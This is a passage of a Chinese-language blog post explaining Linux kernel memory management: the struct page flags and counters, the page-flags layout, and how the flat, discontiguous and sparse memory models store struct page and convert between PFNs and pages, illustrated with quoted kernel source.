*freelist;        <span class="comment">/* 第一个空闲对象 */</span></span><br><span class="line">            <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">                <span class="type">void</span> *s_mem;    <span class="comment">/* slab: first object */</span></span><br><span class="line">                <span class="type">unsigned</span> <span class="type">long</span> counters;        <span class="comment">/* SLUB */</span></span><br><span class="line">                <span class="class"><span class="keyword">struct</span> &#123;</span>            <span class="comment">/* SLUB */</span></span><br><span class="line">                    <span class="type">unsigned</span> inuse:<span class="number">16</span>;</span><br><span class="line">                    <span class="type">unsigned</span> objects:<span class="number">15</span>;</span><br><span class="line">                    <span class="type">unsigned</span> frozen:<span class="number">1</span>;</span><br><span class="line">                &#125;;</span><br><span class="line">            &#125;;</span><br><span class="line">        &#125;;</span><br></pre></td></tr></table></figure><p>Linux kernel 中的 slab allocator 一共有三种：slab、slob、slub，其中比较常用的是 slub 分配器，关于 slab allocator 将在后续的文章中进行更为详细的叙述，下图是一张 slub 分配器的 overview</p><p><img src="https://i.loli.net/2021/07/22/ivPnbsjHyI94m5z.png" alt="image.png"></p><h3 id="flags：标志位"><a href="#flags：标志位" class="headerlink" title="flags：标志位"></a>flags：标志位</h3><p>即该页的标志位成员，用以表示该页所处在的状态，每一个位表示一种状态，故一张页可以有 32 种不同的状态，这些状态定义于 <code>include/linux/page-flags.h</code> 中，<strong>该字段与体系无关</strong></p><p>我们可以通过该头文件中定义的枚举类型获取相应的值：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">enum</span> <span class="title">pageflags</span> &#123;</span></span><br><span class="line">    PG_locked,        <span class="comment">/* Page is locked. Don&#x27;t touch. */</span></span><br><span class="line">    PG_referenced,</span><br><span class="line">    PG_uptodate,</span><br><span class="line">    PG_dirty,</span><br><span class="line">    PG_lru,</span><br><span class="line">    PG_active,</span><br><span class="line">    PG_workingset,</span><br><span class="line">    PG_waiters,        <span class="comment">/* Page has waiters, check its waitqueue. Must be bit #7 and in the same byte as &quot;PG_locked&quot; */</span></span><br><span class="line">    PG_error,</span><br><span class="line">    PG_slab,</span><br><span class="line">    PG_owner_priv_1,    <span class="comment">/* Owner use. If pagecache, fs may use*/</span></span><br><span class="line">    PG_arch_1,</span><br><span class="line">    PG_reserved,</span><br><span class="line">    PG_private,        <span class="comment">/* If pagecache, has fs-private data */</span></span><br><span class="line">    PG_private_2,        <span class="comment">/* If pagecache, has fs aux data */</span></span><br><span class="line">    PG_writeback,        <span class="comment">/* Page is under writeback */</span></span><br><span class="line">    PG_head,        <span class="comment">/* A head page */</span></span><br><span class="line">    PG_mappedtodisk,    <span class="comment">/* Has blocks allocated on-disk */</span></span><br><span class="line">    PG_reclaim,        <span class="comment">/* To be reclaimed asap */</span></span><br><span class="line">    PG_swapbacked,        <span class="comment">/* Page is backed by RAM/swap */</span></span><br><span class="line">    PG_unevictable,        <span class="comment">/* Page is &quot;unevictable&quot;  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MMU</span></span><br><span class="line">    PG_mlocked,        <span class="comment">/* Page is vma mlocked */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_ARCH_USES_PG_UNCACHED</span></span><br><span class="line">    PG_uncached,        <span class="comment">/* Page has been mapped as uncached */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_MEMORY_FAILURE</span></span><br><span class="line">    PG_hwpoison,        <span class="comment">/* hardware poisoned page. Don&#x27;t touch */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">if</span> defined(CONFIG_IDLE_PAGE_TRACKING) &amp;&amp; defined(CONFIG_64BIT)</span></span><br><span class="line">    PG_young,</span><br><span class="line">    PG_idle,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_64BIT</span></span><br><span class="line">    PG_arch_2,</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    __NR_PAGEFLAGS,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Filesystems */</span></span><br><span class="line">    PG_checked = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* SwapBacked */</span></span><br><span class="line">    PG_swapcache = PG_owner_priv_1,    <span class="comment">/* Swap page: swp_entry_t in private */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Two page bits are conscripted by FS-Cache to maintain local caching</span></span><br><span class="line"><span class="comment">     * state.  These bits are set on pages belonging to the netfs&#x27;s inodes</span></span><br><span class="line"><span class="comment">     * when those inodes are being locally cached.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    PG_fscache = PG_private_2,    <span class="comment">/* page backed by cache */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* XEN */</span></span><br><span class="line">    <span class="comment">/* Pinned in Xen as a read-only pagetable page. */</span></span><br><span class="line">    PG_pinned = PG_owner_priv_1,</span><br><span class="line">    <span class="comment">/* Pinned as part of domain save (see xen_mm_pin_all()). */</span></span><br><span class="line">    PG_savepinned = PG_dirty,</span><br><span class="line">    <span class="comment">/* Has a grant mapping of another (foreign) domain&#x27;s page. */</span></span><br><span class="line">    PG_foreign = PG_owner_priv_1,</span><br><span class="line">    <span class="comment">/* Remapped by swiotlb-xen. */</span></span><br><span class="line">    PG_xen_remapped = PG_owner_priv_1,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* SLOB */</span></span><br><span class="line">    PG_slob_free = PG_private,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Compound pages. Stored in first tail page&#x27;s flags */</span></span><br><span class="line">    PG_double_map = PG_workingset,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* non-lru isolated movable page */</span></span><br><span class="line">    PG_isolated = PG_reclaim,</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Only valid for buddy pages. Used to track pages that are reported */</span></span><br><span class="line">    PG_reported = PG_uptodate,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li><code>PG_locked</code>：该页已被上锁，说明此时该页正在被使用</li><li><code>PG_referenced</code>：该页刚刚被访问过；该标志位与 PG_reclaim 标志位共同被用于匿名与文件备份缓存的页面回收</li><li><code>PG_uptodate</code>：该页处在最新状态（up-to-date）；当对该页完成一次读取时，该页便变更为 up-to-date 状态，除非发生了磁盘 IO 错误</li><li><code>PG_dirty</code>：该页为<strong>脏页</strong>，即该页的内容已被修改，应当尽快将内容写回磁盘上</li><li><code>PG_lru</code>：该页处在一个 LRU 链表上</li><li><code>PG_active</code>：该页面位于活跃 lru 链表中</li><li><code>PG_workingset</code>：该页位于某个进程的 working set（工作集，即一个进程同时使用的内存数量，例如一个进程可能分配了114514MB内存，但是在同一时刻只使用其中的1919MB，这就是工作集）中</li><li><code>PG_waiters</code>：有进程在等待该页面</li><li><code>PG_error</code>：该页在 I&#x2F;O 过程中出现了差错</li><li><code>PG_slab</code>：该页由 slab 使用</li><li><code>PG_owner_priv_1</code>：该页由其所有者使用，若是作为 pagecache 页面，则可能是被文件系统使用</li><li><code>PG_arch_1</code>：该标志位与体系结构相关联</li><li><code>PG_reserved</code>：该页被保留，不能够被 swap out（内核会将不活跃的页交换到磁盘上）</li><li><code>PG_private</code> &amp;&amp; <code>PG_private2</code>：该页拥有私有数据（private 字段）</li><li><code>PG_writeback</code>：该页正在被写到磁盘上</li><li><code>PG_head</code>：在内核中有时需要将多个页组成一个 compound pages，而设置该状态时表明该页是 compound pages 的第一个页</li><li><code>PG_mappedtodisk</code>：该页被映射到硬盘中</li><li><code>PG_reclaim</code>：该页可以被回收</li><li><code>PG_swapbacked</code>：该页的后备存储器为 swap&#x2F;RAM</li><li><code>PG_unevictable</code>：该页不可被回收（被锁），且会出现在 <code>LRU_UNEVICTABLE</code> 链表中</li><li><code>PG_mlocked</code>：该页被对应的 vma 上锁（通常是系统调用 mlock）</li><li><code>PG_uncached</code>：该页被设置为不可缓存</li><li><code>PG_hwpoison</code>：硬件相关的标志位</li><li><code>PG_young</code>：</li><li><code>PG_idle</code>：</li><li><code>PG_arch_2</code>：64位下的体系结构相关标志位</li></ul><h4 id="flags-内存复用"><a href="#flags-内存复用" class="headerlink" title="flags 内存复用"></a>flags 内存复用</h4><p>为了节省空间，flags 字段除了用作标志位外还给其他结构使用，其划分的形式其实与内核配置的内存模型有关，在 <code>include\linux\page-flags-layout.h</code>  文件中描述了五种划分形式（其实是三大种）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * page-&gt;flags layout:</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * There are five possibilities for how page-&gt;flags get laid out.  The first</span></span><br><span class="line"><span class="comment"> * pair is for the normal case without sparsemem. The second pair is for</span></span><br><span class="line"><span class="comment"> * sparsemem when there is plenty of space for node and section information.</span></span><br><span class="line"><span class="comment"> * The last is when there is insufficient space in page-&gt;flags and a separate</span></span><br><span class="line"><span class="comment"> * lookup is necessary.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * No sparsemem or sparsemem vmemmap: |       NODE     | ZONE |             ... | FLAGS |</span></span><br><span class="line"><span class="comment"> *      &quot; plus space for last_cpupid: |       NODE     | ZONE | LAST_CPUPID ... | FLAGS |</span></span><br><span class="line"><span class="comment"> * classic sparse with space for node:| SECTION | NODE | ZONE |             ... | FLAGS |</span></span><br><span class="line"><span class="comment"> *      &quot; plus space for last_cpupid: | SECTION | NODE | ZONE | LAST_CPUPID ... | FLAGS |</span></span><br><span class="line"><span class="comment"> * classic sparse no space for node:  | SECTION |     ZONE    | ... | FLAGS |</span></span><br><span class="line"><span class="comment"> */</span></span><br></pre></td></tr></table></figure><h5 id="非-sparse-内存模式-x2F-sparse-vmemmap-内存模式"><a href="#非-sparse-内存模式-x2F-sparse-vmemmap-内存模式" class="headerlink" title="非 sparse 内存模式 &#x2F; sparse vmemmap 内存模式"></a>非 sparse 内存模式 &#x2F; sparse vmemmap 内存模式</h5><p>如下图所示，低位用作该 page 的 flag，高位分别标识其归属的 zone， node id（非 NUMA 系统中为0），中间剩余的位保留</p><p><img src="https://i.loli.net/2021/11/25/8J9pm3n1eZuTKi6.png" alt="image.png"></p><p>这种形式中若是开启了 <code>last_cpuid</code> 则是下面这个样子：</p><p><img src="https://i.loli.net/2021/11/25/xhNpH3vkmli8EXt.png" alt="image.png"></p><h5 id="sparse-内存模式"><a href="#sparse-内存模式" class="headerlink" title="sparse 内存模式"></a>sparse 内存模式</h5><p>如下图所示，相比起第一种形式多了一个 SECTION 字段标识其归属的 <code>mem_section</code></p><p><img src="https://i.loli.net/2021/11/25/CETbQSKwV8er5OR.png" alt="image.png"></p><p>若是开启了 <code>last_cpuid</code> 则是下面这个样子</p><p><img src="https://i.loli.net/2021/11/25/KDSHvF4LjOXpIcE.png" alt="image.png"></p><h5 id="没有-Node-的-sparse-内存模式"><a href="#没有-Node-的-sparse-内存模式" class="headerlink" title="没有 Node 的 sparse 内存模式"></a>没有 Node 的 sparse 内存模式</h5><p>主要是针对非 NUMA 设计的，在这种模式下取消了 Node 结构</p><p><img src="https://i.loli.net/2021/11/25/QiJChHBdvARktOs.png" alt="image.png"></p><h3 id="mapcount：映射计数"><a href="#mapcount：映射计数" class="headerlink" title="_mapcount：映射计数"></a>_mapcount：映射计数</h3><p>记录该页被页表映射的次数，每个进程有其独立的页表，故可以理解为该值记录了该页被多少个进程共享，其初始值为 -1</p><p>由于这是一个联合体，若是该页既不是 PageSlab 也没有被映射到用户空间，则为 page_type 字段，具体说明定义于 <code>/include/linux/page-flags.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For pages that are never mapped to userspace (and aren&#x27;t PageSlab),</span></span><br><span class="line"><span class="comment"> * page_type may be used.  Because it is initialised to -1, we invert the</span></span><br><span class="line"><span class="comment"> * sense of the bit, so __SetPageFoo *clears* the bit used for PageFoo, and</span></span><br><span class="line"><span class="comment"> * __ClearPageFoo *sets* the bit used for PageFoo.  We reserve a few high and</span></span><br><span class="line"><span class="comment"> * low bits so that an underflow or overflow of page_mapcount() won&#x27;t be</span></span><br><span class="line"><span class="comment"> * mistaken for a page type value.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_TYPE_BASE    0xf0000000</span></span><br><span class="line"><span class="comment">/* Reserve        0x0000007f to catch underflows of page_mapcount */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_MAPCOUNT_RESERVE    -128</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_buddy    0x00000080</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_offline    0x00000100</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_table    0x00000200</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PG_guard    0x00000400</span></span><br></pre></td></tr></table></figure><h3 id="refcount：引用计数"><a href="#refcount：引用计数" class="headerlink" title="_refcount：引用计数"></a>_refcount：引用计数</h3><p>该字段用作该页面<strong>在内核中</strong>的引用计数器，初始时页面为空闲状态，该计数器为 0，每当该页面被分配引用时计数器会 + 1，被其他页面进行引用时也会 + 1</p><p>当引用计数器为 0 时表示该页面为空闲状态或即将要被释放，若大于 0 则表示正在被使用，暂时不会释放</p><p>内核中提供了两个函数 <code>get_page()</code>与 <code>put_page()</code> 来进行引用计数的增减，后者在引用计数器为 1 时会调用 <code>__put_single_page()</code> 释放该页面（1-&gt;0，该页面已空闲）</p><h3 id="virtual：虚拟地址"><a href="#virtual：虚拟地址" class="headerlink" title="**virtual：虚拟地址**"></a>**virtual：虚拟地址**</h3><p>该字段为该物理页框对应的的<strong>虚拟地址</strong>，那么这里又要放上这张经典的图：</p><p><img src="https://i.loli.net/2021/11/23/q6jTAJkU9XuCHWV.png" alt="image.png"></p><p>每一个 struct page 对应一个物理页框，那么这个 virtual 字段其实就是<strong>上图的反向映射</strong></p><h2 id="II-不同内存模型下的-struct-page-存储方式"><a href="#II-不同内存模型下的-struct-page-存储方式" class="headerlink" title="II.不同内存模型下的 struct page 存储方式"></a>II.不同内存模型下的 struct page 存储方式</h2><p>Linux 提供了三种内存模型，定义于 <code>include/asm-generic/memory_model.h</code> 中，如下图所示（偷的图，侵删）：</p><p><img src="https://i.loli.net/2021/11/25/wLzFuCB5n1DAIY7.png" alt="image.png"></p><p>内存模型在编译期就会被确定下来，目前常用的是 <code>Sparse Memory</code> 模型，即离散内存模型</p><h3 id="Flat-Memory"><a href="#Flat-Memory" class="headerlink" title="Flat Memory"></a>Flat Memory</h3><p>平滑内存模型。物理内存地址连续，有一个<strong>全局变量</strong> <code>mem_map</code> ——由一个大的 struct page 数组直接对应现有的物理内存</p><h3 id="Discontiguous-Memory"><a href="#Discontiguous-Memory" class="headerlink" title="Discontiguous Memory"></a>Discontiguous Memory</h3><p>非连续性内存模型。主要针对内存中存在空洞的情况。</p><p>对于每一段连续的物理内存，都有一个 <code>pglist_data</code> 结构体进行对应，其成员 <code>node_mem_map</code> 为一个 struct page 指针，指向一个 page 结构体数组，由该结构体对应到该段连续物理内存</p><p>有一个<strong>全局变量</strong> <code>node_data</code> 为一个 pglist_data 指针数组，其中存放着指向每一个 pglist_data 的指针，该数组的大小为 <code>MAX_NUMNODES</code></p><h3 id="Sparse-Memory"><a href="#Sparse-Memory" class="headerlink" title="Sparse Memory"></a>Sparse Memory</h3><p>离散内存模型。在一个 mem_section 结构体中存在一个 <code>section_mem_map</code> 成员指向一个 struct page 数组对应一段连续的物理内存，即将内存按照 section 为单位进行分段</p><p>存在一个全局指针数组 <code>mem_section</code> （与结构体同名）存放所有的 <code>mem_section</code> 指针，指向<strong>理论上支持的内存空间</strong>，每个 section 对应的物理内存不一定存在，若不存在则此时该 section 的指针为 NULL</p><p>这种模型<strong>支持内存的热拔插</strong></p><blockquote><p>图还是偷的，侵删</p></blockquote><p><img src="https://i.loli.net/2021/11/25/RN47OEoaM31xQhA.png" alt="image.png"></p><h4 id="mem-section-结构体"><a href="#mem-section-结构体" class="headerlink" title="mem_section 结构体"></a>mem_section 结构体</h4><p>该结构体定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> &#123;</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 逻辑上这指向一个 pages 结构体数组，</span></span><br><span class="line"><span class="comment">     * 然而，他的存储还有一些别的魔力</span></span><br><span class="line"><span class="comment">     * (参见 sparse.c::sparse_init_one_section())</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 此外，在引导的早期，我们对此处节区的位置的</span></span><br><span class="line"><span class="comment">     * 节点的id进行编码，以指引分配。</span></span><br><span class="line"><span class="comment">     * (参见 sparse.c::memory_present())</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * 将之声明为一个 unsigned long，至少可以让人在</span></span><br><span class="line"><span class="comment">     * 错误使用之前完成一次（类型）转换</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> section_mem_map;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mem_section_usage</span> *<span class="title">usage</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_PAGE_EXTENSION</span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 若是 SPARSEMEM, pgdat 没有 page_ext 指针.</span></span><br><span class="line"><span class="comment">     * 我们使用 section. (关于这个，参见 page_ext.h)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page_ext</span> *<span class="title">page_ext</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> pad;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">     * 警告: mem_section 的大小必须是2的幂次方， 以便于</span></span><br><span class="line"><span class="comment">     * 让计算与使用 SECTION_ROOT_MASK 有意义</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h4 id="CONFIG-SPARSEMEM-EXTREME-：动态分配-mem-section-数组"><a href="#CONFIG-SPARSEMEM-EXTREME-：动态分配-mem-section-数组" class="headerlink" title="_CONFIG_SPARSEMEM_EXTREME_：动态分配 mem_section 数组"></a>_CONFIG_SPARSEMEM_EXTREME_：动态分配 <code>mem_section</code> 数组</h4><p>内核编译选项之一，若开启了则连 <code>mem_section</code> 数组的空间也是动态分配的，在 section 较多的情况下通常会开启这个编译选项</p><h4 id="全局-mem-section-数组"><a href="#全局-mem-section-数组" class="headerlink" title="全局 mem_section 数组"></a>全局 mem_section 数组</h4><p>该数组中存放着指向所有 mem_section 结构体的指针，定义于 <code>/mm/sparse.c</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> **<span class="title">mem_section</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> <span class="title">mem_section</span>[<span class="title">NR_SECTION_ROOTS</span>][<span class="title">SECTIONS_PER_ROOT</span>]</span></span><br><span class="line"><span class="class">    ____<span class="title">cacheline_internodealigned_in_smp</span>;</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>若未开启 <em>CONFIG_SPARSEMEM_EXTREME</em> 编译选项则 mem_section 为一个常规的<strong>二维数组</strong>，否则为一个<strong>二级指针</strong>，其所指向空间内存动态分配</p><p>对于后一种情况，其结构如下图所示：</p><p><img src="https://i.loli.net/2021/12/03/wVpetDxj5gRlfWN.png" alt="自己画的图.png"></p><h4 id="PFN-与-page-结构体间的转换"><a href="#PFN-与-page-结构体间的转换" class="headerlink" title="PFN 与 page 结构体间的转换"></a>PFN 与 page 结构体间的转换</h4><p>kernel 中提供了两个用以在 PFN（Page Frame Numer） 与 page 结构体之间进行转换的宏，定义于 <code>/include/asm-generic/memory_model.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">elif</span> defined(CONFIG_SPARSEMEM)</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Note: 节区的 mem_map 被编码以表示其 start_pfn.</span></span><br><span class="line"><span class="comment"> * section[i].section_mem_map == mem_map&#x27;s address - start_pfn;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __page_to_pfn(pg)                    \</span></span><br><span class="line"><span class="meta">(&#123;    const struct page *__pg = (pg);                \</span></span><br><span class="line"><span class="meta">    int __sec = page_to_section(__pg);            \</span></span><br><span class="line"><span class="meta">    (unsigned long)(__pg - __section_mem_map_addr(__nr_to_section(__sec)));    \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> __pfn_to_page(pfn)                \</span></span><br><span class="line"><span class="meta">(&#123;    unsigned long __pfn = (pfn);            \</span></span><br><span class="line"><span class="meta">    struct mem_section *__sec = __pfn_to_section(__pfn);    \</span></span><br><span class="line"><span class="meta">    __section_mem_map_addr(__sec) + __pfn;        \</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span> <span class="comment">/* CONFIG_FLATMEM/DISCONTIGMEM/SPARSEMEM */</span></span></span><br></pre></td></tr></table></figure><p>在这里我们需要注意一点：<strong>mem_section 结构体的 section_mem_map 中存储的为 page 数组与 PFN 的差值</strong></p><h5 id="（1）page-结构体到-PFN：page-结构体地址减去对应-mem-section-gt-section-mem-map"><a href="#（1）page-结构体到-PFN：page-结构体地址减去对应-mem-section-gt-section-mem-map" class="headerlink" title="（1）page 结构体到 PFN：page 结构体地址减去对应 mem_section-&gt;section_mem_map"></a>（1）page 结构体到 PFN：page 结构体地址减去对应 mem_section-&gt;section_mem_map</h5><p>该宏首先会使用 <code>page_to_section()</code> <strong>通过 page 结构体的 flags 字段</strong>获取该 page 所属的 section 标号，该函数定义于 <code>/include/linux/mm.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">unsigned</span> <span class="type">long</span> <span class="title function_">page_to_section</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> page *page)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> (page-&gt;flags &gt;&gt; SECTIONS_PGSHIFT) &amp; SECTIONS_MASK;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后使用 <code>__nr_to_section()</code> 来获取对应的 mem_section 结构体的地址，该函数定义于 <code>/include/linux/mmzone.h</code> 中，如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="class"><span class="keyword">struct</span> <span class="title">mem_section</span> *__<span class="title">nr_to_section</span>(<span class="title">unsigned</span> <span class="title">long</span> <span class="title">nr</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line">    <span class="keyword">if</span> (!mem_section)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (!mem_section[SECTION_NR_TO_ROOT(nr)])</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">return</span> &amp;mem_section[SECTION_NR_TO_ROOT(nr)][nr &amp; SECTION_ROOT_MASK];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用到一个宏 <code>SEECTION_NR_TO_ROOT</code>，定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_SPARSEMEM_EXTREME</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECTIONS_PER_ROOT       (PAGE_SIZE / sizeof (struct mem_section))</span></span><br><span class="line"><span class="meta">#<span class="keyword">else</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECTIONS_PER_ROOT    1</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SECTION_NR_TO_ROOT(sec)    ((sec) / SECTIONS_PER_ROOT)</span></span><br></pre></td></tr></table></figure><p>我们默认开启 <code>CONFIG_SPARSEMEM_EXTREME</code>，此时 <code>SECTION_PER_ROOT</code> 意为一张页中 mem_section 结构体的数量，即宏 <code>SEECTION_NR_TO_ROOT</code> 